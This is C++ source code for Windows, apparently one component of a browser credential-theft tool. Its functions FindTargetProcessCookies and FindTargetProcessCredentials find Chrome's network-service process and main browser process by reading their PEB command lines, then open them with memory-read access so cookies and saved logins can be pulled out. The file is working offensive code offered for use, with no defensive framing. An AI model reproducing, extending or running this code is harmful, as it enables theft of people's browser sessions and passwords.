#include <Windows.h>
#include "PEB.h"
#include <tlhelp32.h>
#include <stdio.h>
#include <shlwapi.h>

#pragma comment(lib, "Shlwapi.lib")

typedef enum _PROCESSINFOCLASS {
    ProcessBasicInformation,
    ProcessQuotaLimits,
    ProcessIoCounters,
    ProcessVmCounters,
    ProcessTimes,
    ProcessBasePriority,
    ProcessRaisePriority,
    ProcessDebugPort,
    ProcessExceptionPort,
    ProcessAccessToken,
    ProcessLdtInformation,
    ProcessLdtSize,
    ProcessDefaultHardErrorMode,
    ProcessIoPortHandlers,		  // Note: this is kernel mode only
    ProcessPooledUsageAndLimits,
    ProcessWorkingSetWatch,
    ProcessUserModeIOPL,
    ProcessEnableAlignmentFaultFixup,
    ProcessPriorityClass,
    ProcessWx86Information,
    ProcessHandleCount,
    ProcessAffinityMask,
    ProcessPriorityBoost,
    ProcessDeviceMap,
    ProcessSessionInformation,
    ProcessForegroundInformation,
    ProcessWow64Information,
    ProcessImageFileName,
    ProcessLUIDDeviceMapsEnabled,
    ProcessBreakOnTermination,
    ProcessDebugObjectHandle,
    ProcessDebugFlags,
    ProcessHandleTracing,
    ProcessIoPriority,
    ProcessExecuteFlags,
    ProcessTlsInformation,
    ProcessCookie,
    ProcessImageInformation,
    ProcessCycleTime,
    ProcessPagePriority,
    ProcessInstrumentationCallback,
    ProcessThreadStackAllocation,
    ProcessWorkingSetWatchEx,
    ProcessImageFileNameWin32,
    ProcessImageFileMapping,
    ProcessAffinityUpdateMode,
    ProcessMemoryAllocationMode,
    ProcessGroupInformation,
    ProcessTokenVirtualizationEnabled,
    ProcessConsoleHostProcess,
    ProcessWindowInformation,
    MaxProcessInfoClass			 // MaxProcessInfoClass should always be the last enum
} PROCESSINFOCLASS;

typedef LONG KPRIORITY;

typedef struct _PROCESS_BASIC_INFORMATION {
    NTSTATUS ExitStatus;
    PPEB PebBaseAddress;
    ULONG_PTR AffinityMask;
    KPRIORITY BasePriority;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION, * PPROCESS_BASIC_INFORMATION;

typedef NTSTATUS(NTAPI* NtQueryInformationProcess)(
    IN  HANDLE ProcessHandle,
    IN  PROCESSINFOCLASS ProcessInformationClass,
    OUT PVOID ProcessInformation,
    IN  ULONG ProcessInformationLength,
    OUT PULONG ReturnLength OPTIONAL
    );

BOOLEAN GetProcessName(HANDLE hProcess, LPCWSTR& targetBrowser) {

    wchar_t processPath[MAX_PATH];
    DWORD size = sizeof(processPath) / sizeof(processPath[0]);

    // Query the full process image name
    if (!QueryFullProcessImageName(hProcess, 0, processPath, &size)) {
        wprintf(TEXT("QueryFullProcessImageName failed to get target process name"));
        return FALSE;
    }

    const wchar_t* executableName = PathFindFileName(processPath);
    if (wcscmp(executableName, targetBrowser) == 0)
        return TRUE;

    return FALSE;
}

BOOLEAN ReadRemoteProcessPEB(HANDLE hProcess, OUT PEB* peb) {

    HMODULE hNtDll = LoadLibrary(TEXT("ntdll.dll"));
    if (hNtDll == NULL || hNtDll == INVALID_HANDLE_VALUE) {
        wprintf(TEXT("LoadLibrary could not load ntdll"));
        return FALSE;
    }
    NtQueryInformationProcess pNtQueryInformationProcess = (NtQueryInformationProcess)GetProcAddress(hNtDll, "NtQueryInformationProcess");

    PROCESS_BASIC_INFORMATION processInfo{ 0 };
    ULONG szInfo = 0;

    if (SUCCEEDED(pNtQueryInformationProcess(hProcess, ProcessBasicInformation, &processInfo, sizeof(PROCESS_BASIC_INFORMATION), &szInfo))
        && szInfo == sizeof(PROCESS_BASIC_INFORMATION)
        && processInfo.PebBaseAddress) {

        size_t szPEB = 0;

        if (!ReadProcessMemory(hProcess, processInfo.PebBaseAddress, peb, sizeof(PEB), &szPEB) || szPEB < sizeof(PEB)) {
            wprintf(TEXT("Failed to read Chrome PEB"));
            return FALSE;
        }
        else
            return TRUE;
    }
    else
    {
        wprintf(TEXT("ProcessBasicInformation failed"));
        return FALSE;
    }

    return FALSE;
}

BOOLEAN ReadPEBProcessParameters(HANDLE hProcess, PEB* peb, WCHAR** args) {

    UNICODE_STRING commandLine;
    if (!ReadProcessMemory(hProcess, &peb->ProcessParameters->CommandLine, &commandLine, sizeof(commandLine), NULL))
    {
        wprintf(TEXT("Could not read CommandLine!\n"));
        return FALSE;
    }

    *args = (WCHAR*)malloc(commandLine.MaximumLength);
    if (*args != 0 && !ReadProcessMemory(hProcess, commandLine.Buffer, *args, commandLine.MaximumLength, NULL))
    {
        wprintf(TEXT("Could not read the command line string!\n"));
        free(*args);
        return FALSE;
    }

    return TRUE;
}

DWORD FindTargetProcessCookies(LPCWSTR processName)
{
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE)
    {
        wprintf(TEXT("CreateToolhelp32Snapshot failed"));
        return 0;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe32))
    {
        wprintf(TEXT("Process32First failed"));
        CloseHandle(hProcessSnap);
        return 0;
    }

    //Target Chrome process has the following flag, this is how we find the right PID
    //--utility-sub-type=network.mojom.NetworkService
    const WCHAR* flags = TEXT("--utility-sub-type=network.mojom.NetworkService");

    do
    {
        if (wcscmp(pe32.szExeFile, processName) == 0)
        {
            PEB peb = { 0 };
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
            if (ReadRemoteProcessPEB(hProcess, &peb))
            {
                WCHAR* commandLine{ 0 };
                if (ReadPEBProcessParameters(hProcess, &peb, &commandLine) && &commandLine != 0)
                {
                    if (wcsstr(commandLine, flags) != 0)
                    {
                        free(commandLine);
                        CloseHandle(hProcessSnap);
                        return pe32.th32ProcessID;;
                    }
                    free(commandLine);
                }
            }
        }

    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return 0;
}

DWORD FindTargetProcessCredentials(LPCWSTR processName)
{
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE)
    {
        wprintf(TEXT("CreateToolhelp32Snapshot failed"));
        return 0;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe32))
    {
        wprintf(TEXT("Process32First failed"));
        CloseHandle(hProcessSnap);
        return 0;
    }

    do
    {
        if (wcscmp(pe32.szExeFile, processName) == 0)
        {
            HANDLE hParent = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ParentProcessID);

            if (!GetProcessName(hParent, processName))
            {
                CloseHandle(hProcessSnap);
                CloseHandle(hParent);
                return pe32.th32ProcessID;
            }
            CloseHandle(hParent);
        }

    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return 0;
}